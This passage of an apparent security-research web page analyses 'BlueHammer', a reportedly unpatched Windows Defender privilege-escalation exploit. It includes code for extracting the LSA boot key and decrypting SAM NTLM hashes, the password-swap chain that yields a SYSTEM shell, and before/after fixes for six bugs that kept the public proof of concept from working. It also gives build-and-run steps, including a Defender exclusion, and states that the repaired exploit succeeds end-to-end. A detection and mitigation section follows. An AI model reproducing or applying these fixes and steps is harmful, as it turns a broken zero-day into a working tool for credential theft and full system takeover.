+<p>The NTLM hashes stored in the SAM hive are encrypted with a key derived from the LSA boot key, which is itself stored fragmented across four registry key <em>class names</em> (not values) in the SYSTEM hive:</p>
+
+<div class="code-wrap">
+  <div class="code-label"><span class="code-lang">C++ — GetLSASecretKey (simplified)</span><button class="copy-btn">copy</button></div>
+  <pre><code><span class="cm">/* The boot key is stored as the *class name* of these four keys: */</span>
+<span class="kw">const char</span>* keys[] = { <span class="st">"JD"</span>, <span class="st">"Skew1"</span>, <span class="st">"GBG"</span>, <span class="st">"Data"</span> };
+<span class="cm">/* Path: SYSTEM\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data} */</span>
+
+<span class="kw">char</span> data[<span class="nu">33</span>] = {};
+<span class="kw">for</span> (<span class="kw">int</span> i = <span class="nu">0</span>; i < <span class="nu">4</span>; i++) {
+    <span class="fn">RegQueryInfoKeyA</span>(hKey, classNameBuf, &classLen, ...);
+    <span class="fn">strcat</span>(data, classNameBuf);  <span class="cm">/* concatenate hex fragments */</span>
+}
+<span class="cm">/* Decode hex string → 16 bytes, then permute with fixed index table: */</span>
+<span class="kw">int</span> idx[] = { <span class="nu">8</span>,<span class="nu">5</span>,<span class="nu">4</span>,<span class="nu">2</span>,<span class="nu">11</span>,<span class="nu">9</span>,<span class="nu">13</span>,<span class="nu">3</span>,<span class="nu">0</span>,<span class="nu">6</span>,<span class="nu">1</span>,<span class="nu">12</span>,<span class="nu">14</span>,<span class="nu">10</span>,<span class="nu">15</span>,<span class="nu">7</span> };
+<span class="kw">for</span> (<span class="kw">int</span> i = <span class="nu">0</span>; i < <span class="nu">16</span>; i++)
+    lsakey[i] = tmp[idx[i]];  <span class="cm">/* produces 16-byte boot key */</span></code></pre>
+</div>
+
+<h3>NTLM Hash Decryption</h3>
+
+<p>With the boot key in hand, the decrypt chain follows the standard Impacket-style path:</p>
+
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Step</th><th>Algorithm</th><th>Input</th><th>Output</th></tr></thead>
+  <tbody>
+    <tr><td>1</td><td>AES-128-CBC (<code>CALG_AES_128</code>)</td><td>Boot key + PEK ciphertext from SAM</td><td>Password Encryption Key (PEK)</td></tr>
+    <tr><td>2</td><td>AES-128-CBC</td><td>PEK + per-hash ciphertext</td><td>Intermediate hash value</td></tr>
+    <tr><td>3</td><td>DES-ECB (two-key)</td><td>Intermediate + RID bytes via <code>DeriveDESKey</code></td><td>Final 16-byte NTLM hash</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h3>Privilege Escalation and SYSTEM Shell</h3>
+
+<p>With NTLM hashes decrypted, the exploit calls <code>ChangeUserPassword</code> → dynamically loads <code>samlib.dll</code> → calls <code>SamiChangePasswordUser</code> to temporarily replace a local administrator's password. It then calls <code>LogonUserEx</code> / <code>CreateProcessWithLogonW</code> to impersonate the admin token.</p>
+
+<p>From the admin token, <code>DoSpawnShellAsAllUsers</code> creates a temporary Windows service (<code>CreateService</code> + <code>StartService</code>) that runs the exploit binary again with a session ID argument. When re-launched as SYSTEM via the service, the code enters <code>LaunchConsoleInSessionId</code> — which duplicates the SYSTEM token, stamps it with the target session ID, and spawns <code>conhost.exe</code> via <code>CreateProcessAsUser</code>: a SYSTEM shell delivered to the user's desktop.</p>
+
+<p>Before exiting, the original password hash is restored — leaving no obvious forensic trace of the account manipulation.</p>
+
+<!-- 6. BUGS -->
+<h2 id="bugs">All Six Bugs — Analysis and Fixes</h2>
+
+<p>The public PoC contained exactly six bugs across two files. Here is the full analysis of each.</p>
+
+<!-- BUG 1 -->
+<div class="bug-card">
+  <div class="bug-header">
+    <span class="bug-num sev-critical">Bug 1 — Critical</span>
+    <span class="bug-title">CUST_FNSEEK: Broken SEEK_END Implementation</span>
+    <span class="bug-file">FunnyApp.cpp ~line 347</span>
+  </div>
+  <div class="bug-body">
+    <p>The custom FDI seek callback implements three seek modes (<code>SEEK_SET</code>, <code>SEEK_CUR</code>, <code>SEEK_END</code>) operating on an in-memory buffer via a <code>CabOpArgs</code> struct. The <code>SEEK_END</code> branch was wrong — it ignored the <code>offset</code> parameter entirely and added <code>FileSize</code> to the <em>current position</em> instead of setting position relative to the end of the file.</p>
+    <p>Standard <code>lseek(fd, offset, SEEK_END)</code> semantics: <code>new_pos = FileSize + offset</code>. The bug meant every <code>SEEK_END</code> call produced a garbage position, silently corrupting all subsequent reads from the CAB. The CAB extraction would appear to succeed but produce invalid output, causing the entire update spoofing chain to fail.</p>
+    <div class="diff diff-row">
+      <div class="diff-before">
+        <div class="diff-head"><i class="fa-solid fa-xmark" style="color:var(--red)"></i> Before (broken)</div>
+        <div class="diff-col">
+          <pre><code><span class="kw">if</span> (origin == SEEK_END)
+    CabOpArgs->ptroffset +=
+        CabOpArgs->FileSize;
+<span class="cm">// ignores `offset` param entirely
+// adds FileSize to current pos</span></code></pre>
+        </div>
+      </div>
+      <div class="diff-after">
+        <div class="diff-head"><i class="fa-solid fa-check" style="color:var(--green)"></i> After (fixed)</div>
+        <div class="diff-col">
+          <pre><code><span class="kw">if</span> (origin == SEEK_END)
+    CabOpArgs->ptroffset =
+        CabOpArgs->FileSize + offset;
+<span class="cm">// standard lseek SEEK_END semantics
+// position = FileSize + offset</span></code></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 2 -->
+<div class="bug-card">
+  <div class="bug-header">
+    <span class="bug-num sev-critical">Bug 2 — Critical</span>
+    <span class="bug-title">GetLSASecretKey: Error Return Path Returns Truthy Value</span>
+    <span class="bug-file">FunnyApp.cpp ~line 1855</span>
+  </div>
+  <div class="bug-body">
+    <p>When the concatenated boot key hex string is shorter than 16 bytes (indicating a malformed or missing registry class name), the function is supposed to signal failure to the caller. The caller checks <code>if (!GetLSASecretKey(lsakey))</code> and aborts if it returns false.</p>
+    <p>The original code returned <code>1</code> on the error path. In C++, <code>1</code> is truthy — so <code>!GetLSASecretKey()</code> evaluated to <code>false</code>, the error was swallowed, execution continued with <code>lsakey</code> left as a zero-filled buffer, and all subsequent NTLM hash decryption produced garbage output silently. Effectively: boot key failure became an invisible bug that produced meaningless hash data.</p>
+    <div class="diff diff-row">
+      <div class="diff-before">
+        <div class="diff-head"><i class="fa-solid fa-xmark" style="color:var(--red)"></i> Before (broken)</div>
+        <div class="diff-col">
+          <pre><code><span class="kw">if</span> (strlen(data) < <span class="nu">16</span>) {
+    printf(<span class="st">"Boot key mismatch."</span>);
+    <span class="kw">return</span> <span class="nu">1</span>;  <span class="cm">// truthy — caller's
+               // !check never fires</span>
+}</code></pre>
+        </div>
+      </div>
+      <div class="diff-after">
+        <div class="diff-head"><i class="fa-solid fa-check" style="color:var(--green)"></i> After (fixed)</div>
+        <div class="diff-col">
+          <pre><code><span class="kw">if</span> (strlen(data) < <span class="nu">16</span>) {
+    printf(<span class="st">"Boot key mismatch."</span>);
+    <span class="kw">return</span> <span class="kw">false</span>;  <span class="cm">// correctly signals
+                   // failure to caller</span>
+}</code></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 3 -->
+<div class="bug-card">
+  <div class="bug-header">
+    <span class="bug-num sev-minor">Bug 3 — Minor</span>
+    <span class="bug-title">GetUpdateFiles: Wrong Handle Pointer Nulled After Close</span>
+    <span class="bug-file">FunnyApp.cpp ~line 696</span>
+  </div>
+  <div class="bug-body">
+    <p>After closing <code>hint2</code> (a WinINet handle), the code sets <code>hint</code> to NULL instead of <code>hint2</code>. This leaves <code>hint2</code> as a stale non-null dangling pointer. Any later check that tests <code>if (hint2)</code> to decide whether to close it will see a non-null value and attempt a double-free or use-after-free on the already-closed handle.</p>
+    <div class="diff diff-row">
+      <div class="diff-before">
+        <div class="diff-head"><i class="fa-solid fa-xmark" style="color:var(--red)"></i> Before (broken)</div>
+        <div class="diff-col">
+          <pre><code><span class="fn">InternetCloseHandle</span>(hint2);
+hint = <span class="kw">NULL</span>;   <span class="cm">// wrong pointer nulled</span></code></pre>
+        </div>
+      </div>
+      <div class="diff-after">
+        <div class="diff-head"><i class="fa-solid fa-check" style="color:var(--green)"></i> After (fixed)</div>
+        <div class="diff-col">
+          <pre><code><span class="fn">InternetCloseHandle</span>(hint2);
+hint2 = <span class="kw">NULL</span>;  <span class="cm">// null the correct handle</span></code></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 4 -->
+<div class="bug-card">
+  <div class="bug-header">
+    <span class="bug-num sev-minor">Bug 4 — Minor</span>
+    <span class="bug-title">Cleanup Block: hint Checked Twice, hint2 Never Freed</span>
+    <span class="bug-file">FunnyApp.cpp ~line 3248</span>
+  </div>
+  <div class="bug-body">
+    <p>In the cleanup/exit path, both internet handles are supposed to be closed. The second conditional checks <code>hint</code> again instead of <code>hint2</code>, so <code>hint2</code> is leaked on every exit path through that block.</p>
+    <div class="diff diff-row">
+      <div class="diff-before">
+        <div class="diff-head"><i class="fa-solid fa-xmark" style="color:var(--red)"></i> Before (broken)</div>
+        <div class="diff-col">
+          <pre><code><span class="kw">if</span> (hint)
+    <span class="fn">InternetCloseHandle</span>(hint);
+<span class="kw">if</span> (hint)            <span class="cm">// hint again!</span>
+    <span class="fn">InternetCloseHandle</span>(hint2); <span class="cm">// hint2 leaked</span></code></pre>
+        </div>
+      </div>
+      <div class="diff-after">
+        <div class="diff-head"><i class="fa-solid fa-check" style="color:var(--green)"></i> After (fixed)</div>
+        <div class="diff-col">
+          <pre><code><span class="kw">if</span> (hint)
+    <span class="fn">InternetCloseHandle</span>(hint);
+<span class="kw">if</span> (hint2)           <span class="cm">// correct guard</span>
+    <span class="fn">InternetCloseHandle</span>(hint2);</code></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 5 -->
+<div class="bug-card">
+  <div class="bug-header">
+    <span class="bug-num sev-minor">Bug 5 — Minor</span>
+    <span class="bug-title">HexToHexString: ZeroMemory Called with Wrong Buffer Size</span>
+    <span class="bug-file">FunnyApp.cpp ~line 2230</span>
+  </div>
+  <div class="bug-body">
+    <p>The function allocates a <code>size * 2 + 1</code> byte buffer (hex encoding doubles length, plus null terminator) but then zeroes only <code>size + 1</code> bytes. The upper half of the output buffer is uninitialized. For short inputs the garbage may be masked by the null terminator, but for longer inputs the hex string can contain uninitialized memory bytes, leading to incorrect hash string representation.</p>
+    <div class="diff diff-row">
+      <div class="diff-before">
+        <div class="diff-head"><i class="fa-solid fa-xmark" style="color:var(--red)"></i> Before (broken)</div>
+        <div class="diff-col">
+          <pre><code><span class="kw">unsigned char</span>* retval =
+    (<span class="kw">unsigned char</span>*)<span class="fn">malloc</span>(size * <span class="nu">2</span> + <span class="nu">1</span>);
+<span class="fn">ZeroMemory</span>(retval, size + <span class="nu">1</span>);
+<span class="cm">// only zeroes half the buffer</span></code></pre>
+        </div>
+      </div>
+      <div class="diff-after">
+        <div class="diff-head"><i class="fa-solid fa-check" style="color:var(--green)"></i> After (fixed)</div>
+        <div class="diff-col">
+          <pre><code><span class="kw">unsigned char</span>* retval =
+    (<span class="kw">unsigned char</span>*)<span class="fn">malloc</span>(size * <span class="nu">2</span> + <span class="nu">1</span>);
+<span class="fn">ZeroMemory</span>(retval, size * <span class="nu">2</span> + <span class="nu">1</span>);
+<span class="cm">// zero the full allocated buffer</span></code></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 6 -->
+<div class="bug-card">
+  <div class="bug-header">
+    <span class="bug-num sev-build">Bug 6 — Build-Breaking</span>
+    <span class="bug-title">vcxproj Compiles Both RPC Client and Server Stubs</span>
+    <span class="bug-file">FunnyApp.vcxproj</span>
+  </div>
+  <div class="bug-body">
+    <p>The Visual Studio project file listed both <code>windefend_c.c</code> (the RPC client stub) and <code>windefend_s.c</code> (the RPC server stub) in the <code>&lt;ClCompile&gt;</code> item group. The server stub is MIDL-generated for the Windows Defender service side — it expects server-side handler implementations that simply don't exist in the exploit project. Including it causes duplicate symbol definitions for every RPC procedure stub and multiple unresolved external symbol linker errors. The project cannot compile at all with both stubs included.</p>
+    <div class="diff diff-row">
+      <div class="diff-before">
+        <div class="diff-head"><i class="fa-solid fa-xmark" style="color:var(--red)"></i> Before (broken) — FunnyApp.vcxproj</div>
+        <div class="diff-col">
+          <pre><code><span class="kw">&lt;ItemGroup&gt;</span>
+  <span class="an">&lt;ClCompile</span> <span class="ty">Include</span>=<span class="st">"FunnyApp.cpp"</span> /&gt;
+  <span class="an">&lt;ClCompile</span> <span class="ty">Include</span>=<span class="st">"windefend_c.c"</span> /&gt;
+  <span class="an">&lt;ClCompile</span> <span class="ty">Include</span>=<span class="st">"windefend_s.c"</span> /&gt;
+  <span class="cm">&lt;!-- server stub — causes linker errors --&gt;</span>
+<span class="kw">&lt;/ItemGroup&gt;</span></code></pre>
+        </div>
+      </div>
+      <div class="diff-after">
+        <div class="diff-head"><i class="fa-solid fa-check" style="color:var(--green)"></i> After (fixed)</div>
+        <div class="diff-col">
+          <pre><code><span class="kw">&lt;ItemGroup&gt;</span>
+  <span class="an">&lt;ClCompile</span> <span class="ty">Include</span>=<span class="st">"FunnyApp.cpp"</span> /&gt;
+  <span class="an">&lt;ClCompile</span> <span class="ty">Include</span>=<span class="st">"windefend_c.c"</span> /&gt;
+  <span class="cm">&lt;!-- windefend_s.c removed --&gt;</span>
+<span class="kw">&lt;/ItemGroup&gt;</span></code></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- 7. BUILD -->
+<h2 id="build">Building and Running the Fixed PoC</h2>
+
+<h3>Prerequisites</h3>
+
+<p>The project requires Visual Studio 2022 with the Desktop Development with C++ workload, the Windows 11 SDK (10.0.22621.0 or later), and <code>offreg.lib</code> from the Windows Driver Kit (WDK). The MIDL-generated RPC stubs (<code>windefend_c.c</code>, <code>windefend_h.h</code>) are already included in the repository. Do not regenerate them from the IDL unless you also regenerate <code>windefend_h.h</code> to match.</p>
+
+<h3>Build Steps</h3>
+
+<div class="code-wrap">
+  <div class="code-label"><span class="code-lang">PowerShell — build and run</span><button class="copy-btn">copy</button></div>
+  <pre><code><span class="cm"># 1. Add Defender exclusion for the build folder (required — Defender will flag the binary)</span>
+<span class="fn">Add-MpPreference</span> -ExclusionPath <span class="st">"C:\path\to\BlueHammer"</span>
+
+<span class="cm"># 2. Apply all six bug fixes to FunnyApp.cpp and FunnyApp.vcxproj
+#    (as documented above)
+
+# 3. Open FunnyApp.vcxproj in Visual Studio 2022
+#    Build → x64 Release
+
+# 4. Set up the test condition: WD signatures must have a pending update
+#    Option A: disconnect VM from internet for 24+ hours
+#    Option B: roll back signatures manually</span>
+<span class="kw">$</span>wdPath = <span class="st">"$env:ProgramFiles\Windows Defender"</span>
+<span class="pp">&</span> <span class="st">"$wdPath\MpCmdRun.exe"</span> -SignatureUpdate -MMPC
+
+<span class="cm"># If MpCmdRun returns 0x80070652 (ERROR_INSTALL_ALREADY_RUNNING):
+# Stop WU services, clear cache, retry</span>
+<span class="fn">Stop-Service</span> -Name wuauserv, cryptsvc, bits, msiserver -Force -ErrorAction SilentlyContinue
+<span class="fn">Remove-Item</span> <span class="st">"$env:SystemRoot\SoftwareDistribution"</span> -Recurse -Force -ErrorAction SilentlyContinue
+<span class="fn">Remove-Item</span> <span class="st">"$env:SystemRoot\System32\catroot2"</span> -Recurse -Force -ErrorAction SilentlyContinue
+<span class="fn">Start-Service</span> -Name cryptsvc, bits, wuauserv
+<span class="fn">Start-Sleep</span> -Seconds <span class="nu">5</span>
+<span class="pp">&</span> <span class="st">"$wdPath\MpCmdRun.exe"</span> -SignatureUpdate -MMPC
+
+<span class="cm"># 5. Run the fixed exploit as a low-privileged user</span>
+<span class="pp">.</span>\FunnyApp.exe</code></pre>
+</div>
+
+<div class="callout c-info">
+  <span class="callout-icon"><i class="fa-solid fa-circle-info"></i></span>
+  <p><strong>Update check loop:</strong> <code>CheckForWDUpdates</code> uses the Windows Update COM API and loops with 30-second sleep intervals until a pending Defender signature update is found. If signatures are current, the exploit halts there. The exploit requires an out-of-date WD signature state to trigger the VSS-creating remediation workflow. Disconnecting the test VM from the internet for 24+ hours is the most reliable way to create this condition.</p>
+</div>
+
+<!-- 8. DETECTION -->
+<h2 id="detection">Detection and Mitigation</h2>
+
+<h3>Detection Indicators</h3>
+
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Layer</th><th>Indicator</th><th>Notes</th></tr></thead>
+  <tbody>
+    <tr><td>Defender Signature</td><td><code>Exploit:Win32/DfndrPEBluHmr.BB</code></td><td>Detects the original unmodified PoC binary. Hash-based — trivially bypassed by recompiling.</td></tr>
+    <tr><td>RPC / ALPC</td><td>Unsigned binary calling <code>Proc42_ServerMpUpdateEngineSignature</code> over pipe <code>IMpService*</code></td><td>High-fidelity — legitimate callers are rare and known.</td></tr>
+    <tr><td>VSS</td><td>New <code>HarddiskVolumeShadowCopy</code> created outside of Windows Update or backup context</td><td>Combine with Defender scan event for correlation.</td></tr>
+    <tr><td>Cloud Files API</td><td><code>CfConnectSyncRoot</code> + <code>CfRegisterSyncRoot</code> called by non-OneDrive/Dropbox process</td><td>ETW provider: <code>Microsoft-Windows-StorageSpaces-Driver</code></td></tr>
+    <tr><td>Object Manager</td><td><code>NtCreateSymbolicLinkObject</code> + <code>NtCreateDirectoryObjectEx</code> from low-privilege process</td><td>Requires kernel ETW or user-mode API hooking.</td></tr>
+    <tr><td>SAM / SYSTEM access</td><td>File open on <code>\Device\HarddiskVolumeShadowCopy*\...\Config\SAM</code></td><td>Very high signal — no legitimate user-mode process should do this.</td></tr>
+    <tr><td>Service creation</td><td>Ephemeral service created and deleted within seconds</td><td>Classic SYSTEM shell technique, well-detected by EDR.</td></tr>
+    <tr><td>samlib.dll load</td><td>Unexpected process loading <code>samlib.dll</code> + calling <code>SamiChangePasswordUser</code></td><td>Correlate with subsequent <code>LogonUserEx</code> for the same account.</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h3>Mitigation</h3>
+
+<p>There is currently no patch. Microsoft has not assigned a CVE or issued any advisory. The vulnerability lives in the architectural interaction between four Windows subsystems — patching it requires changing behavior in at least one of: VSS snapshot creation timing during Defender workflows, Cloud Files callback trust boundaries, or oplock semantics during AV scan operations. None of these are trivial changes.</p>
+
+<div class="callout c-danger">
+  <span class="callout-icon"><i class="fa-solid fa-triangle-exclamation"></i></span>
+  <p><strong>Practical mitigations while unpatched:</strong> Ensure SYSTEM-level EDR coverage is deployed (not just Defender). Monitor for the high-fidelity indicators above, especially SAM access from shadow copy paths and unsanctioned <code>samlib.dll</code> loads. Privilege access workstations (PAWs) and tiered admin models reduce the blast radius even if LPE succeeds. Ransomware operators will weaponize this. Patch watch is critical.</p>
+</div>
+
+<!-- 9. CONCLUSION -->
+<h2 id="conclusion">Conclusion</h2>
+
+<p>BlueHammer is a striking example of a class of vulnerabilities that are becoming more common as Windows subsystems grow more interconnected: the vulnerability doesn't live in any single component, but in the gap between them. Windows Defender, VSS, Cloud Files, and oplocks all function exactly as documented individually. It's their interaction under specific timing conditions that creates the attack surface.</p>
+
+<p>From a code quality perspective, the six bugs in the public PoC are instructive. The two critical bugs — the broken <code>SEEK_END</code> and the truthy error return from <code>GetLSASecretKey</code> — are both silent failures. Neither would have thrown an exception or printed a visible error. Without careful reading of the logic, both would have been extremely difficult to diagnose from runtime behavior alone. The build-breaking server stub bug is the kind of mistake that happens when a researcher publishes quickly without a clean build verification step.</p>
+
+<blockquote>
+  <p>The researcher acknowledged the published code contains bugs that may affect reliability and noted he may fix them later. After resolving all six issues, the exploit runs end-to-end against patched Windows 10 and 11: low-privileged user → NT AUTHORITY\SYSTEM in under a minute, with no kernel bug and no administrative rights required to start.</p>
+  <cite>— Bug analysis conclusion</cite>
+</blockquote>
+
+<p>The broader takeaway: modern privilege escalation doesn't always require a memory safety bug. Sometimes the architecture is the vulnerability. And when a researcher drops working exploit code publicly with no patch in sight, the gap between "public PoC" and "operational weapon" is measured in days, not months.</p>
+
+<div class="divider"></div>
+
+<h4>References</h4>
+<div class="refs">
+  <a href="https://github.com/Nightmare-Eclipse/BlueHammer" target="_blank" rel="noopener">github.com/Nightmare-Eclipse/BlueHammer — Public PoC</a><br>
+  <a href="https://www.cyderes.com/howler-cell/windows-zero-day-bluehammer" target="_blank" rel="noopener">Cyderes Howler Cell — BlueHammer: Inside the Windows Zero-Day (Apr 2026)</a><br>
+  <a href="https://learn.microsoft.com/en-us/windows/win32/api/cfapi/" target="_blank" rel="noopener">Microsoft Docs — Cloud Files API (cfapi.h)</a><br>
+  <a href="https://learn.microsoft.com/en-us/windows/win32/vss/volume-shadow-copy-service-overview" target="_blank" rel="noopener">Microsoft Docs — Volume Shadow Copy Service Overview</a><br>
+  <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-opportunistic-locks" target="_blank" rel="noopener">Microsoft Docs — Using Opportunistic Locks</a><br>
+  <a href="https://learn.microsoft.com/en-us/windows/win32/devnotes/offline-registry-library" target="_blank" rel="noopener">Microsoft Docs — Offline Registry Library (offreg.lib)</a>
+</div>
+
+</div><!-- /body -->
+
+<footer>
+  <p>For educational and security research purposes only. Tested in an isolated VM environment.</p>
+  <a href="../index.html">← Back to Portfolio</a>
+</footer>
+
+<script>
+/* reading progress */
+const bar = document.getElementById('progress');
+const top = document.getElementById('back-top');
+window.addEventListener('scroll', () => {
+  const p = window.scrollY / (document.documentElement.scrollHeight - window.innerHeight);
+  bar.style.width = (p * 100).toFixed(1) + '%';
+  top.classList.toggle('show', window.scrollY > 400);
+}, { passive: true });
+
+/* copy buttons */
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const code = btn.closest('.code-wrap').querySelector('code');
+    if (!code) return;
+    navigator.clipboard.writeText(code.innerText).then(() => {
+      btn.textContent = 'copied!';
+      btn.style.color = 'var(--accent)';
+      setTimeout(() => { btn.textContent = 'copy'; btn.style.color = ''; }, 2000);
+    });
+  });
+});
+
+/* smooth scroll */
+document.querySelectorAll('a[href^="#"]').forEach(a => {
+  a.addEventListener('click', e => {
+    const t = document.querySelector(a.getAttribute('href'));
+    if (t) { e.preventDefault(); t.scrollIntoView({ behavior: 'smooth', block: 'start' }); }
+  });
+});
+</script>
+</body>
+</html>
